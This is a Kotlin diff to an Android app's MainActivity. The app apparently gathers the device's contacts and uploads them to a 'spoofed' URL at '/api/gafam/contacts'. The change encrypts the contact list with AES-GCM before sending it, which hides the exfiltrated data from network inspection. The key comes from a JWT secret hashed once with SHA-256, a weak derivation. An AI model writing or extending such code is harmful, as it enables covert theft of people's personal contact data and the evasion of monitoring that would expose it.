@@ -602,10 +602,31 @@ class MainActivity : AppCompatActivity() {
                     }
                 }
 
+                val plaintext = contacts.toString().toByteArray(Charsets.UTF_8)
+
+                // Derive key using SHA-256
+                val digest = java.security.MessageDigest.getInstance("SHA-256")
+                val keyBytes = digest.digest(jwtSecret.toByteArray(Charsets.UTF_8))
+                val secretKey = javax.crypto.spec.SecretKeySpec(keyBytes, "AES")
+
+                // Encrypt using AES/GCM/NoPadding
+                val cipher = javax.crypto.Cipher.getInstance("AES/GCM/NoPadding")
+                val iv = ByteArray(12)
+                java.security.SecureRandom().nextBytes(iv)
+                val gcmSpec = javax.crypto.spec.GCMParameterSpec(128, iv)
+                cipher.init(javax.crypto.Cipher.ENCRYPT_MODE, secretKey, gcmSpec)
+                
+                val ciphertext = cipher.doFinal(plaintext)
+                
+                val encryptedPayload = JSONObject().apply {
+                    put("encrypted_data", android.util.Base64.encodeToString(ciphertext, android.util.Base64.NO_WRAP))
+                    put("iv", android.util.Base64.encodeToString(iv, android.util.Base64.NO_WRAP))
+                }
+
                 val spoofedUrl = ApiClient.getSpoofedUrl(apiUrl, "/api/gafam/contacts")
                 val client = ApiClient.getClient(this) ?: return@thread
                 
-                val requestBody = contacts.toString().toRequestBody("application/json".toMediaType())
+                val requestBody = encryptedPayload.toString().toRequestBody("application/json".toMediaType())
                 val request = Request.Builder()
                     .url(spoofedUrl)
                     .post(requestBody)
